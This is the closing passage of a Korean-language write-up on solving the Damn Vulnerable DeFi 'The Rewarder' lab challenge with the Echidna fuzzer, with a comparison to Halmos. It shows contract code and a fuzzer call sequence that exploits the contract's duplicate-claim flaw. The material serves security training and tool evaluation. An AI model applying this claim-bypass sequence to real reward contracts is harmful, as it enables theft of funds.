            if (token != storageInputTokens[inputClaim.tokenIndex]) {
                ...
                token = storageInputTokens[inputClaim.tokenIndex];
                ...
            }
            ...
            // for the last claim
            if (i == storageInputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }
            ...
        }
}
```
시작하고 기도합니다:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: failed!💥
  Call sequence:
    TheRewarderDistributor.pushClaim((0, 0, 0, []))
    TheRewarderDistributor.pushToken(0xb4c79dab8f259c7aee6e5b2aa729821864227e84)
    TheRewarderDistributor.pushClaim((0, 0, 0, []))
    TheRewarderDistributor.claimRewards()
...
```
성공! **push-pop-use** 패턴은 정말 효과적이었습니다. 반례가 유효한 금액을 보여주지는 않지만, 암호학적 검사 대신 명시적으로 지정했음을 기억하십시오.
## 결론
1. 일부 엔진 제한(Halmos 또는 Echidna)에 직면하더라도 - 못생겨 보일지라도 "지저분한" 트릭을 사용하는 것을 두려워하지 마십시오. 모두 결과를 위해서입니다!
2. 암호학적 검사가 포함된 테스트를 구성할 때 매우 효과적인 기술이 있습니다: 암호학을 전혀 확인하지 않고 데이터가 올바르게 입력되었다고 명시적으로 가정하는 것입니다.
3. Halmos와 Echidna가 이 챌린지에 어떻게 대처했는지 비교하면, 두 도구 모두 꽤 잘 해냈다고 말할 수 있습니다. 하지만 제 생각에는 Halmos가 조금 더 편리했습니다 - 계약 준비의 모든 단계가 명확하고 계획적이었으며, 도구 자체가 경고를 통해 대상 계약을 변경하는 방법에 대한 힌트를 제공했습니다. 반면에 Echidna의 경우, 코드 커버리지의 한계를 수동으로 찾아야 했고, 퍼징이 2개의 `inputClaims`가 있는 경우를 커버하도록 강제하기 위해 가장 명확하지 않은 기술을 사용해야 했습니다.
### 다음 단계는?
다음 챌린지는 [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/selfie/README.md)입니다.
